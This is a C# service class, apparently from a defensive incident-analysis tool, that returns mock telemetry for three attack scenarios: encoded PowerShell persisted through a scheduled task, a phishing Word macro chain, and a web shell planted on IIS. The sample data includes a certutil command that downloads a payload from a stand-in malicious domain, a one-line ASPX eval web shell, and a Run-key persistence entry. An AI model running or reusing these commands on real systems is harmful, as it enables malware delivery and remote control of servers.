using System;
using System.Collections.Generic;

namespace SIFTGuardian.Services;

public class TelemetryItem
{
    public string Category { get; set; } = string.Empty; // ProcessTree, ParentProcess, Commandline, Persistence, NetworkActivity
    public string Details { get; set; } = string.Empty;
}

public class EvidenceService
{
    private readonly Dictionary<string, List<TelemetryItem>> _telemetryDb = new(StringComparer.OrdinalIgnoreCase);

    public EvidenceService()
    {
        InitializeTelemetry();
    }

    private void InitializeTelemetry()
    {
        // Scenario 1: Suspicious Endpoint / PowerShell
        _telemetryDb["powershell"] = new List<TelemetryItem>
        {
            new() { Category = "ProcessTree", Details = "explorer.exe (PID: 3012) -> taskeng.exe (PID: 4522) -> cmd.exe (PID: 5122) -> powershell.exe (PID: 5190)" },
            new() { Category = "ParentProcess", Details = "cmd.exe (PID: 5122) executing scheduled task script" },
            new() { Category = "Commandline", Details = "powershell.exe -enc SQB4AGUA..." },
            new() { Category = "Persistence", Details = "Scheduled Task: 'SystemUpdateCheck' executing 'cmd.exe /c powershell.exe -enc SQB4AGUA...'" },
            new() { Category = "NetworkActivity", Details = "powershell.exe (PID: 5190) established connection to 91.228.12.33:80" }
        };

        // Scenario 2: Phishing Word Document
        _telemetryDb["word"] = new List<TelemetryItem>
        {
            new() { Category = "ProcessTree", Details = "explorer.exe (PID: 3012) -> WINWORD.EXE (PID: 8812) -> cmd.exe (PID: 8900) -> certutil.exe (PID: 8944)" },
            new() { Category = "ParentProcess", Details = "WINWORD.EXE (PID: 8812) spawned cmd.exe" },
            new() { Category = "Commandline", Details = "certutil.exe -urlcache -f http://malicious-domain.xyz/payload.exe %TEMP%\\payload.exe" },
            new() { Category = "Persistence", Details = "Registry Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Payload = '%TEMP%\\payload.exe'" },
            new() { Category = "NetworkActivity", Details = "certutil.exe (PID: 8944) downloaded payload from http://malicious-domain.xyz (104.24.11.89)" }
        };

        // Scenario 3: SQL Injection / Web Shell
        _telemetryDb["w3wp"] = new List<TelemetryItem>
        {
            new() { Category = "ProcessTree", Details = "services.exe (PID: 672) -> w3wp.exe (PID: 7420) -> cmd.exe (PID: 9110) -> whoami.exe (PID: 9122)" },
            new() { Category = "ParentProcess", Details = "w3wp.exe (PID: 7420) spawned cmd.exe" },
            new() { Category = "Commandline", Details = "cmd.exe /c echo <%eval request(\"pass\")%> > C:\\inetpub\\wwwroot\\shell.aspx" },
            new() { Category = "Persistence", Details = "Webshell File: C:\\inetpub\\wwwroot\\shell.aspx (last modified: 2026-06-15)" },
            new() { Category = "NetworkActivity", Details = "w3wp.exe (PID: 7420) received POST request to /shell.aspx from 198.51.100.42" }
        };
    }

    public List<TelemetryItem> GetTelemetry(string queryName, string queryData)
    {
        string fullQuery = $"{queryName} {queryData}";
        foreach (var key in _telemetryDb.Keys)
        {
            if (fullQuery.Contains(key, StringComparison.OrdinalIgnoreCase))
            {
                return _telemetryDb[key];
            }
        }

        // Default fallback telemetry if no key matches
        return new List<TelemetryItem>
        {
            new() { Category = "ProcessTree", Details = "explorer.exe (PID: 3012) -> cmd.exe (PID: 4002)" },
            new() { Category = "ParentProcess", Details = "explorer.exe (PID: 3012)" },
            new() { Category = "Commandline", Details = queryData },
            new() { Category = "Persistence", Details = "No persistence mechanism identified in logs" },
            new() { Category = "NetworkActivity", Details = "No suspicious network activity found" }
        };
    }
}
